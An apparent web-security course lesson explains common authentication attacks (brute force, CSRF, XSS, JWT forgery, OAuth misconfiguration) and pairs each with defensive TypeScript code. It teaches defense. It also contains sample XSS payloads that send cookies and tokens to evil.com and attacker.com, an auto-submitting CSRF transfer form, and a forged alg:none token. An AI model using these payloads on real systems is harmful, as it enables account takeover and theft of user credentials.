# Lesson 7: Security Attacks & Defenses

## Why This Is the Most Important Lesson

Everything else in this module — hashing, tokens, OAuth, RBAC — exists
because attackers exist. If we lived in a world without adversaries, you
could store passwords in plaintext and send user IDs as query parameters.

This lesson is about thinking like an attacker. Not because you'll become
one, but because you cannot defend what you don't understand. Every section
follows the same structure: **what the attack is**, **how it works
mechanically**, **how to detect it**, and **how to prevent it**.

Most security breaches aren't sophisticated. They exploit the gap between
what developers think happens and what actually happens.

---

## Brute Force Attacks

### The Mechanics

A brute force attack is exhaustive trial. The attacker tries every possible
password until one works.

```
Attempt 1: POST /login { email: "alice@example.com", password: "aaaaaa" } → 401
Attempt 2: POST /login { email: "alice@example.com", password: "aaaaab" } → 401
Attempt 3: POST /login { email: "alice@example.com", password: "aaaaac" } → 401
...
Attempt 847291: POST /login { email: "alice@example.com", password: "monkey123" } → 200 ✓
```

Variants:
- **Pure brute force**: Try every combination (slow, thorough)
- **Dictionary attack**: Try common passwords from breach lists (fast, effective)
- **Credential stuffing**: Try email+password pairs from other breaches
- **Reverse brute force**: One password, many usernames ("password123" across all accounts)

### Why Rate Limiting Alone Isn't Enough

A naive rate limiter:

```typescript
// BAD — only limits by IP
const loginAttempts = new Map<string, { count: number; resetAt: number }>();

app.post('/login', (req, res) => {
  const ip = req.ip;
  const record = loginAttempts.get(ip) || { count: 0, resetAt: Date.now() + 60000 };

  if (record.count >= 5) {
    return res.status(429).json({ error: 'Too many attempts. Try again later.' });
  }

  record.count++;
  loginAttempts.set(ip, record);
  // ... proceed with login
});
```

Problems:
1. Attacker uses a botnet (thousands of IPs)
2. Attacker rotates through proxies
3. Shared IPs (corporate NAT, VPNs) lock out legitimate users
4. Doesn't protect against distributed attacks

### Multi-Dimensional Rate Limiting

```typescript
import { createHash } from 'node:crypto';

interface RateLimitRecord {
  count: number;
  firstAttempt: number;
  lastAttempt: number;
  blocked: boolean;
  blockedUntil?: number;
}

class AuthRateLimiter {
  private ipLimits = new Map<string, RateLimitRecord>();
  private emailLimits = new Map<string, RateLimitRecord>();
  private ipEmailLimits = new Map<string, RateLimitRecord>();

  // Hash email for privacy in logs
  private hashEmail(email: string): string {
    return createHash('sha256').update(email.toLowerCase()).digest('hex').slice(0, 12);
  }

  private checkLimit(
    store: Map<string, RateLimitRecord>,
    key: string,
    maxAttempts: number,
    windowMs: number,
    blockDurationMs: number
  ): { allowed: boolean; retryAfterMs?: number } {
    const now = Date.now();
    const record = store.get(key);

    if (!record) {
      store.set(key, {
        count: 1,
        firstAttempt: now,
        lastAttempt: now,
        blocked: false,
      });
      return { allowed: true };
    }

    // Currently blocked?
    if (record.blocked && record.blockedUntil && now < record.blockedUntil) {
      return { allowed: false, retryAfterMs: record.blockedUntil - now };
    }

    // Window expired? Reset.
    if (now - record.firstAttempt > windowMs) {
      store.set(key, {
        count: 1,
        firstAttempt: now,
        lastAttempt: now,
        blocked: false,
      });
      return { allowed: true };
    }

    // Within window — check count
    record.count++;
    record.lastAttempt = now;

    if (record.count > maxAttempts) {
      record.blocked = true;
      record.blockedUntil = now + blockDurationMs;
      return { allowed: false, retryAfterMs: blockDurationMs };
    }

    return { allowed: true };
  }

  check(ip: string, email: string): { allowed: boolean; retryAfterMs?: number } {
    const emailHash = this.hashEmail(email);
    const ipEmailKey = `${ip}:${emailHash}`;

    // Layer 1: Per IP — 20 attempts per minute
    const ipCheck = this.checkLimit(this.ipLimits, ip, 20, 60_000, 300_000);
    if (!ipCheck.allowed) return ipCheck;

    // Layer 2: Per email — 5 attempts per 15 minutes
    // (protects against distributed attacks on one account)
    const emailCheck = this.checkLimit(
      this.emailLimits, emailHash, 5, 900_000, 900_000
    );
    if (!emailCheck.allowed) return emailCheck;

    // Layer 3: Per IP+email — 3 attempts per 5 minutes
    const comboCheck = this.checkLimit(
      this.ipEmailLimits, ipEmailKey, 3, 300_000, 600_000
    );
    if (!comboCheck.allowed) return comboCheck;

    return { allowed: true };
  }

  // Call on successful login to reset counters
  onSuccess(ip: string, email: string): void {
    const emailHash = this.hashEmail(email);
    const ipEmailKey = `${ip}:${emailHash}`;

    this.ipLimits.delete(ip);
    this.emailLimits.delete(emailHash);
    this.ipEmailLimits.delete(ipEmailKey);
  }
}
```

### Exponential Backoff

Instead of hard lockouts, increase delay exponentially:

```typescript
function getBackoffDelay(failedAttempts: number): number {
  // 0 failures: 0ms
  // 1 failure:  1 second
  // 2 failures: 2 seconds
  // 3 failures: 4 seconds
  // 5 failures: 16 seconds
  // 10 failures: 512 seconds (~8.5 minutes)
  if (failedAttempts === 0) return 0;
  return Math.min(
    Math.pow(2, failedAttempts - 1) * 1000,
    600_000  // Max 10 minutes
  );
}

// In login handler
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  const attempts = getFailedAttempts(email);
  const delay = getBackoffDelay(attempts);

  if (delay > 0) {
    const lastAttempt = getLastAttemptTime(email);
    const elapsed = Date.now() - lastAttempt;
    if (elapsed < delay) {
      return res.status(429).json({
        error: 'Too many attempts',
        retryAfterMs: delay - elapsed,
      });
    }
  }

  const user = await verifyCredentials(email, password);
  if (!user) {
    incrementFailedAttempts(email);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  resetFailedAttempts(email);
  // ... issue tokens
});
```

### Account Lockout vs Throttling

**Account lockout** (locking the account after N failures) has a dangerous
side effect: an attacker can deliberately lock out any user's account. This
is a denial-of-service attack on individual users.

**Throttling** (progressively slowing responses) is better:
- Legitimate user: minor inconvenience
- Attacker: exponentially slower
- No denial-of-service on the account

### CAPTCHA Integration

CAPTCHAs are a valuable middle ground — they stop bots without locking
accounts:

```typescript
function shouldRequireCaptcha(email: string): boolean {
  const attempts = getFailedAttempts(email);
  return attempts >= 3;  // After 3 failures, require CAPTCHA
}

app.post('/login', async (req, res) => {
  const { email, password, captchaToken } = req.body;

  if (shouldRequireCaptcha(email)) {
    if (!captchaToken) {
      return res.status(400).json({
        error: 'CAPTCHA required',
        requiresCaptcha: true,
      });
    }

    const captchaValid = await verifyCaptcha(captchaToken);
    if (!captchaValid) {
      return res.status(400).json({ error: 'Invalid CAPTCHA' });
    }
  }

  // ... proceed with login
});
```

---

## Credential Stuffing

### What Makes It Different

Credential stuffing isn't brute force — it's more surgical. Attackers use
username/password pairs leaked from OTHER sites. Because people reuse
passwords, a breach at Site A gives attackers access to Site B, C, and D.

```
Attacker obtains: LinkedIn breach → 117 million email:password pairs
Attacker runs:
  POST your-site.com/login { email: "user1@gmail.com", password: "Summer2019!" }
  POST your-site.com/login { email: "user2@gmail.com", password: "qwerty123" }
  POST your-site.com/login { email: "user3@gmail.com", password: "iloveyou" }
  ... 117 million attempts, one per second, from rotating IPs
```

Hit rate: typically 0.1-2%. On 117 million credentials, that's 117,000 to
2.34 million compromised accounts.

### Detection

Credential stuffing has a distinct fingerprint:
1. High volume of login attempts
2. Many different accounts targeted (not just one)
3. Low success rate per account
4. Often from residential proxies (hard to IP-block)

```typescript
interface LoginMetrics {
  totalAttempts: number;
  uniqueEmails: Set<string>;
  successCount: number;
  windowStart: number;
}

class StuffingDetector {
  private metrics = new Map<string, LoginMetrics>();

  recordAttempt(ip: string, email: string, success: boolean): void {
    const now = Date.now();
    let record = this.metrics.get(ip);

    if (!record || now - record.windowStart > 300_000) {
      record = {
        totalAttempts: 0,
        uniqueEmails: new Set(),
        successCount: 0,
        windowStart: now,
      };
      this.metrics.set(ip, record);
    }

    record.totalAttempts++;
    record.uniqueEmails.add(email);
    if (success) record.successCount++;
  }

  isLikelyStuffing(ip: string): boolean {
    const record = this.metrics.get(ip);
    if (!record) return false;

    // Many different emails from one IP = suspicious
    if (record.uniqueEmails.size > 10) return true;

    // High attempt count with low success rate
    if (record.totalAttempts > 20 && record.successCount / record.totalAttempts < 0.05) {
      return true;
    }

    return false;
  }
}
```

### Prevention

1. **Breached password checking** (HIBP API — covered in Lesson 2)
2. **Multi-factor authentication** (covered in Lesson 9)
3. **Device fingerprinting** — flag logins from unrecognized devices
4. **Behavioral analysis** — real users don't attempt login at machine speed

---

## Replay Attacks

### The Attack

An attacker captures a valid authentication request and "replays" it later
to impersonate the user.

```
1. Attacker intercepts: POST /login { email: "alice@...", token: "abc123" }
2. Later: Attacker sends the EXACT same request
3. Server sees a valid request and authenticates the attacker
```

This applies to any authentication token, API key, or signed request.

### Why TLS Isn't Always Enough

TLS prevents network-level interception. But replay attacks can happen
through:
- Compromised proxy servers
- Server-side log files containing tokens
- Malicious browser extensions
- Shared computers

### Prevention: Nonces

A nonce (number used once) ensures each request is unique:

```typescript
import { randomBytes, createHmac, timingSafeEqual } from 'node:crypto';

const usedNonces = new Set<string>();

function createSignedRequest(
  method: string,
  path: string,
  body: string,
  secret: string
): { nonce: string; timestamp: number; signature: string } {
  const nonce = randomBytes(16).toString('hex');
  const timestamp = Date.now();

  const signatureInput = `${method}\n${path}\n${body}\n${nonce}\n${timestamp}`;
  const signature = createHmac('sha256', secret)
    .update(signatureInput)
    .digest('hex');

  return { nonce, timestamp, signature };
}

function verifySignedRequest(
  method: string,
  path: string,
  body: string,
  nonce: string,
  timestamp: number,
  signature: string,
  secret: string
): boolean {
  // 1. Check timestamp — reject requests older than 5 minutes
  const age = Date.now() - timestamp;
  if (age > 300_000 || age < -30_000) {
    return false;  // Too old or from the future
  }

  // 2. Check nonce — reject replayed requests
  if (usedNonces.has(nonce)) {
    return false;  // This exact request was already processed
  }
  usedNonces.add(nonce);

  // 3. Verify signature
  const signatureInput = `${method}\n${path}\n${body}\n${nonce}\n${timestamp}`;
  const expected = createHmac('sha256', secret)
    .update(signatureInput)
    .digest();
  const actual = Buffer.from(signature, 'hex');

  if (expected.length !== actual.length) return false;
  return timingSafeEqual(expected, actual);
}
```

This pattern is used by AWS Signature V4, Stripe webhooks, and most
production API signature schemes.

### Prevention: Short Token Lifetimes

JWTs with 5-15 minute expiry windows limit the replay window:

```typescript
// Even if stolen, this token is useless in 15 minutes
const token = jwt.sign(
  { sub: userId, jti: randomUUID() },
  SECRET,
  { expiresIn: '15m' }
);
```

---

## Cross-Site Request Forgery (CSRF)

### The Attack in Detail

CSRF exploits the browser's automatic cookie-sending behavior. You already
saw the basics in Lesson 3. Here's the complete picture.

```html
<!-- evil.com serves this page -->
<html>
<body>
  <!-- Invisible form that auto-submits -->
  <form action="https://bank.com/api/transfer" method="POST" id="attack">
    <input type="hidden" name="to" value="attacker-account" />
    <input type="hidden" name="amount" value="50000" />
  </form>
  <script>document.getElementById('attack').submit();</script>

  <!-- Or use an image tag for GET requests -->
  <img src="https://bank.com/api/transfer?to=attacker&amount=50000" />

  <!-- Or use fetch (won't send cookies with SameSite=Lax on POST) -->
  <script>
    fetch('https://bank.com/api/transfer', {
      method: 'POST',
      credentials: 'include',  // Send cookies
      body: JSON.stringify({ to: 'attacker', amount: 50000 }),
      headers: { 'Content-Type': 'application/json' },
    });
  </script>
</body>
</html>
```

The victim visits evil.com. The browser sends the request to bank.com
WITH the victim's session cookie. The server sees a valid session and
processes the transfer.

### Why It Works

Three conditions must be true:
1. User has an active session (cookie) with the target site
2. The target action can be triggered by a cross-origin request
3. The request doesn't require information the attacker can't guess

### Defense: The Complete Strategy

**Layer 1: SameSite Cookies**

```typescript
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',   // Blocks cross-origin POST
});
```

`SameSite=Lax` blocks cross-origin POST, fetch, and iframe requests from
sending cookies. It allows top-level navigations (clicking a link).

**Layer 2: CSRF Tokens (Synchronizer Token Pattern)**

```typescript
import { randomBytes, timingSafeEqual } from 'node:crypto';

function generateCsrfToken(): string {
  return randomBytes(32).toString('hex');
}

// Middleware: attach CSRF token to all responses
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCsrfToken();
  }

  // Make token available to templates/responses
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Middleware: verify CSRF token on state-changing requests
function verifyCsrf(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();  // Safe methods don't need CSRF protection
  }

  const token = req.body._csrf
    || req.headers['x-csrf-token']
    || req.query._csrf;

  if (!token || typeof token !== 'string') {
    return res.status(403).json({ error: 'Missing CSRF token' });
  }

  const expected = Buffer.from(req.session.csrfToken);
  const actual = Buffer.from(token);

  if (expected.length !== actual.length || !timingSafeEqual(expected, actual)) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

app.use(verifyCsrf);
```

**Layer 3: Origin/Referer Header Checking**

```typescript
function checkOrigin(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const origin = req.headers.origin || req.headers.referer;
  if (!origin) {
    return res.status(403).json({ error: 'Missing origin header' });
  }

  const allowedOrigins = ['https://your-app.com', 'https://www.your-app.com'];
  const requestOrigin = new URL(origin).origin;

  if (!allowedOrigins.includes(requestOrigin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }

  next();
}
```

---

## Cross-Site Scripting (XSS) → Token Theft

### The Attack

XSS allows an attacker to execute JavaScript in the context of your
application. If your auth tokens are accessible to JavaScript, they're
gone.

### Types of XSS

**Reflected XSS**: Malicious input reflected back immediately.

```
https://your-app.com/search?q=<script>fetch('https://evil.com/?token='+localStorage.getItem('token'))</script>
```

**Stored XSS**: Malicious input stored in the database, served to all users.

```typescript
// A user submits a comment with embedded JavaScript
const comment = '<img src=x onerror="fetch(\'https://evil.com/?cookie=\'+document.cookie)">';
// If you render this without escaping...
res.send(`<div>${comment}</div>`);  // XSS!
```

**DOM-based XSS**: Manipulation happens entirely in the client-side code.

```javascript
// Vulnerable code
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
// Attacker: ?name=<script>steal_tokens()</script>
```

### Token Theft via XSS

```javascript
// If tokens are in localStorage:
const token = localStorage.getItem('accessToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token }),
});

// If tokens are in a non-HttpOnly cookie:
const cookies = document.cookie;
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: cookies,
});
```

### Prevention

**1. Never store tokens in localStorage or sessionStorage.**

Use HttpOnly cookies for refresh tokens. Store access tokens in memory
(JavaScript closure):

```typescript
// Token stored in a closure — survives within the SPA session
// but not accessible from devtools.cookie or devtools.storage
let accessToken: string | null = null;

function setToken(token: string) {
  accessToken = token;
}

function getToken(): string | null {
  return accessToken;
}

// Use in fetch calls
async function authenticatedFetch(url: string, options: RequestInit = {}) {
  const token = getToken();
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
  });
}
```

**2. Content Security Policy (CSP)**

CSP is the most powerful XSS mitigation. It controls which scripts can
run on your page:

```typescript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",           // Only load resources from same origin
    "script-src 'self'",            // Only run scripts from same origin
    "style-src 'self' 'unsafe-inline'", // Allow inline styles (needed for some frameworks)
    "img-src 'self' data: https:",  // Allow images from self, data URIs, and HTTPS
    "connect-src 'self' https://api.your-app.com", // Allow API calls
    "frame-ancestors 'none'",       // Prevent framing (clickjacking)
    "base-uri 'self'",             // Prevent base tag injection
    "form-action 'self'",          // Forms only submit to same origin
  ].join('; '));
  next();
});
```

**3. Output Encoding**

Always encode user-generated content before rendering:

```typescript
function escapeHtml(str: string): string {
  const escapeMap: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, (char) => escapeMap[char]);
}

// Use when rendering user input
res.send(`<div>${escapeHtml(userInput)}</div>`);
```

**4. Security Headers**

```typescript
app.use((req, res, next) => {
  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Enable browser XSS filter (legacy, but doesn't hurt)
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');

  // Control referrer information
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Enforce HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

  next();
});
```

---

## Session Fixation

### The Attack

Session fixation is subtle. The attacker doesn't steal a session — they
set one up in advance.

```
1. Attacker visits your app, gets session ID: abc123
2. Attacker tricks victim into using that session:
   https://your-app.com/login?sessionId=abc123
3. Victim logs in — the server authenticates session abc123
4. Attacker already has session abc123 — now they're authenticated too
```

This works when:
- Session IDs are accepted from URL parameters or request bodies
- The session isn't regenerated on login
- The session ID persists through the auth state change

### Prevention: Session Regeneration

**Always create a new session ID after authentication state changes:**

```typescript
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await verifyCredentials(email, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // CRITICAL: Destroy old session, create new one
  const oldSession = req.session;
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).json({ error: 'Session error' });
    }

    // Copy any necessary data from old session
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.authenticatedAt = Date.now();

    res.json({ message: 'Logged in' });
  });
});
```

**Also regenerate on privilege elevation:**

```typescript
app.post('/admin/sudo', async (req, res) => {
  // User re-enters password for elevated access
  const user = await verifyCredentials(req.session.email, req.body.password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Regenerate session for the new privilege level
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.elevated = true;
    req.session.elevatedAt = Date.now();
    req.session.elevatedExpiry = Date.now() + 15 * 60 * 1000; // 15 min
    res.json({ message: 'Elevated access granted' });
  });
});
```

### Additional Defenses

1. **Never accept session IDs from URLs or request bodies** — only from cookies
2. **Bind sessions to client fingerprints** (IP + User-Agent)
3. **Set short session timeouts**
4. **Invalidate sessions on logout**

---

## JWT Vulnerabilities

### 1. The `alg: "none"` Attack

The JWT specification allows `alg: "none"`, meaning the token has no
signature. Some libraries accept this by default.

```typescript
// Attacker crafts a token with alg: none
const header = base64url('{"alg":"none","typ":"JWT"}');
const payload = base64url('{"sub":"admin","role":"owner"}');
const fakeToken = `${header}.${payload}.`;  // Empty signature

// Vulnerable server accepts it:
const decoded = jwt.verify(fakeToken, SECRET); // If library allows 'none'
```

**Defense:**

```typescript
// ALWAYS specify allowed algorithms
const payload = jwt.verify(token, SECRET, {
  algorithms: ['HS256'],  // Explicitly whitelist — never allow 'none'
});
```

### 2. Algorithm Confusion Attack

This is one of the most clever JWT attacks. It exploits a subtle
interaction between HS256 and RS256.

**Setup**: Your server uses RS256 (asymmetric). It has a private key
(secret) and a public key (published).

**Attack**:
1. Attacker gets your public key (it's public — by design)
2. Attacker creates a token with `alg: "HS256"` (symmetric)
3. Attacker signs it with your **public key** as the HMAC secret
4. Your server reads `alg: "HS256"`, uses the "secret" to verify
5. If the library uses the same key variable for both algorithms,
   and the public key IS the "secret", the signature validates

```typescript
// Vulnerable code — the same 'key' is used for any algorithm
function verifyToken(token: string, key: string) {
  return jwt.verify(token, key);  // Library reads alg from header
}

// Attacker: signed with HS256 using the public key as secret
// Server: verifies with HS256 using the public key as secret
// Result: VALID — attacker forged a token
```

**Defense:**

```typescript
// Explicitly specify the algorithm — never trust the header
function verifyToken(token: string) {
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],  // ONLY accept RS256
  });
}
```

### 3. Weak Signing Secrets

```typescript
// BAD — dictionary attackable
const SECRET = 'secret';
const SECRET = 'password';
const SECRET = 'jwt-secret';

// An attacker can brute-force the secret offline:
// 1. Capture a valid token
// 2. Try signing the same header.payload with common secrets
// 3. Compare the resulting signature
// Tools like hashcat can try billions of secrets per second
```

**Defense:**

```typescript
import { randomBytes } from 'node:crypto';

// Generate a 256-bit random secret
const SECRET = randomBytes(32).toString('hex');
// e.g., 'a7f3b2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1'

// Or use an environment variable generated externally
const SECRET = process.env.JWT_SECRET!;
// Validate at startup
if (!SECRET || SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}
```

### 4. Token Injection via Header Manipulation

```typescript
// BAD — reading token from multiple sources without priority
function getToken(req: Request): string | null {
  return req.headers.authorization?.split(' ')[1]
    || req.query.token as string
    || req.cookies.token;
}
// Attacker can inject a token via query parameter even if
// the Cookie header has a different (legitimate) token
```

**Defense:**

```typescript
// GOOD — use exactly one source
function getToken(req: Request): string | null {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) return null;
  return authHeader.slice(7);
}
```

---

## Man-in-the-Middle (MITM) Attacks

### The Attack

An attacker positions themselves between the client and server, intercepting
and potentially modifying traffic.

```
Client ←→ Attacker ←→ Server
           ↑
    Reads/modifies all traffic
```

Common scenarios:
- Unsecured WiFi networks (coffee shops, airports)
- Compromised routers
- DNS poisoning
- ARP spoofing on local networks

### What an Attacker Can Do

Without TLS:
- Read all traffic (passwords, tokens, personal data)
- Modify requests and responses
- Inject malicious content
- Steal session cookies and auth tokens

### Prevention

**1. Enforce HTTPS Everywhere**

```typescript
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(301, `https://${req.hostname}${req.url}`);
  }
  next();
});
```

**2. HTTP Strict Transport Security (HSTS)**

HSTS tells the browser to ONLY use HTTPS for your domain, even if the
user types `http://`:

```typescript
app.use((req, res, next) => {
  // Browser will refuse HTTP connections for 1 year
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});
```

**3. Certificate Pinning (for mobile apps)**

Mobile apps can pin the expected server certificate, rejecting any
certificate not explicitly trusted — even if a CA has been compromised.

```typescript
// In a Node.js HTTP client (for service-to-service calls)
import https from 'node:https';

const pinnedFingerprint = 'sha256/YourServerCertFingerprint==';

const agent = new https.Agent({
  checkServerIdentity: (host, cert) => {
    const fingerprint = `sha256/${cert.fingerprint256}`;
    if (fingerprint !== pinnedFingerprint) {
      throw new Error(`Certificate pinning failed for ${host}`);
    }
  },
});
```

**4. Secure Cookie Flags**

```typescript
res.cookie('session', value, {
  secure: true,     // Only sent over HTTPS
  httpOnly: true,   // Not accessible to JavaScript
  sameSite: 'lax',  // CSRF protection
});
```

---

## OAuth Misconfiguration Attacks

### 1. Open Redirect via Redirect URI

If the authorization server doesn't strictly validate redirect URIs, an
attacker can steal authorization codes:

```
Legitimate: redirect_uri=https://your-app.com/callback
Attacker:   redirect_uri=https://evil.com/steal
```

The authorization code is sent to evil.com. The attacker exchanges it for
tokens.

**Defense:**
- Register exact redirect URIs — no wildcards, no patterns
- Many providers now enforce exact match

### 2. State Parameter Omission (CSRF on OAuth)

Without the `state` parameter:

```
1. Attacker starts OAuth flow, gets authorization code
2. Attacker crafts: https://your-app.com/callback?code=ATTACKERS_CODE
3. Victim clicks the link
4. Your app exchanges the code → links ATTACKER's social account
   to VICTIM's session
5. Attacker can now "Login with Google" using their Google account
   to access victim's account on your site
```

**Defense:**

```typescript
// Generate random state on auth initiation
const state = randomBytes(16).toString('hex');
req.session.oauthState = state;

// Verify on callback
app.get('/callback', (req, res) => {
  if (req.query.state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state parameter' });
  }
  delete req.session.oauthState;
  // ... proceed with code exchange
});
```

### 3. Scope Elevation

An attacker modifies the scope parameter to request more permissions than
your app intends:

```
Your app requests: scope=openid email
Attacker modifies: scope=openid email https://www.googleapis.com/auth/drive
```

**Defense:**
- Validate the returned scopes match what you requested
- Google and most providers show a consent screen for additional scopes

### 4. Token Leakage via Referrer

If a page that handles OAuth tokens contains links to external sites,
the token might leak via the `Referer` header:

```
https://your-app.com/callback?code=AUTHORIZATION_CODE
  ↓ User clicks a link
Referer: https://your-app.com/callback?code=AUTHORIZATION_CODE
  → sent to the external site
```

**Defense:**

```typescript
// Set Referrer-Policy header
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
// Or better, for callback pages:
res.setHeader('Referrer-Policy', 'no-referrer');
```

### 5. Insufficient Token Validation

```typescript
// BAD — trusting the ID token without verification
const idToken = tokens.id_token;
const payload = JSON.parse(
  Buffer.from(idToken.split('.')[1], 'base64url').toString()
);
// Anyone could craft this payload!

// GOOD — verify the JWT signature with the provider's public key
const payload = jwt.verify(idToken, googlePublicKey, {
  algorithms: ['RS256'],
  audience: GOOGLE_CLIENT_ID,
  issuer: 'https://accounts.google.com',
});
```

---

## Putting It All Together: Defense in Depth

No single defense is sufficient. Security is layers:

```
Layer 1: HTTPS + HSTS                    (transport security)
Layer 2: Secure cookies (HttpOnly, Secure, SameSite) (cookie security)
Layer 3: CSRF tokens                     (request authenticity)
Layer 4: CSP headers                     (XSS prevention)
Layer 5: Rate limiting + CAPTCHA         (brute force prevention)
Layer 6: Input validation + output encoding (injection prevention)
Layer 7: Token management (short expiry, rotation) (credential security)
Layer 8: Monitoring + alerting           (detection)
```

```typescript
// Complete security middleware stack
import express from 'express';
import helmet from 'helmet';

const app = express();

// 1. Security headers (uses helmet for convenience)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true },
}));

// 2. HTTPS redirect
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(301, `https://${req.hostname}${req.url}`);
  }
  next();
});

// 3. Rate limiting
app.use('/auth/login', authRateLimiter);
app.use('/auth/register', authRateLimiter);

// 4. CSRF protection for session-based routes
app.use(csrfProtection);

// 5. Input validation on all routes
app.use(express.json({ limit: '10kb' }));  // Prevent large payload attacks
```

---

## Exercises

### Exercise 1: Build a Rate Limiter

Implement a multi-dimensional rate limiter:
- Limit by IP (20 requests/minute)
- Limit by email (5 attempts/15 minutes)
- Limit by IP+email combo (3 attempts/5 minutes)
- Support exponential backoff
- Include a cleanup function for expired records
- Write tests that verify each dimension works independently

### Exercise 2: XSS Payload Lab

Create a simple Express app with a "comments" feature. Then:
1. Insert an XSS payload that steals a cookie
2. Show that it executes without CSP
3. Add CSP headers and show the payload is blocked
4. Add output encoding and show the payload renders as text
5. Try at least 3 different XSS payloads (script tag, event handler, DOM-based)

### Exercise 3: CSRF Attack and Defense

Build two servers:
1. A "bank" app with session cookies and a /transfer endpoint
2. An "attacker" app that hosts a CSRF exploit page

Demonstrate:
1. The attack working (no SameSite, no CSRF token)
2. SameSite=Lax blocking the attack
3. CSRF tokens blocking the attack
4. Both defenses combined

### Exercise 4: JWT Vulnerability Scanner

Write a tool that takes a JWT and checks for:
1. `alg: "none"` — flag as critical
2. Weak/common secrets (try a dictionary of common secrets)
3. Missing `exp` claim — flag as warning
4. Expiration too far in the future — flag as warning
5. Sensitive data in payload (email, phone, SSN patterns)

### Exercise 5: OAuth Security Audit

Given a set of OAuth callback handlers, identify all vulnerabilities:
1. No state parameter verification
2. Token stored in localStorage
3. Redirect URI not validated
4. Access token used for authentication (instead of ID token)
5. No PKCE used for a public client

---

## Summary

| Attack | Target | Primary Defense | Secondary Defense |
|--------|--------|-----------------|-------------------|
| Brute force | Login endpoint | Rate limiting + backoff | CAPTCHA, account lockout |
| Credential stuffing | User accounts | Breach password check | MFA, device fingerprinting |
| Replay | Auth tokens | Nonces + timestamps | Short token expiry |
| CSRF | Session cookies | SameSite cookies | CSRF tokens |
| XSS | Client-side data | CSP headers | Output encoding |
| Session fixation | Session IDs | Session regeneration | Never accept IDs from URLs |
| JWT alg:none | Token verification | Whitelist algorithms | Never trust headers |
| Algorithm confusion | Asymmetric JWT | Specify algorithm | Separate key handling |
| MITM | Network traffic | TLS/HTTPS + HSTS | Certificate pinning |
| OAuth redirect | Auth codes | Exact redirect URIs | State parameter |

Next lesson: managing the full lifecycle of tokens — from creation through
rotation to revocation.
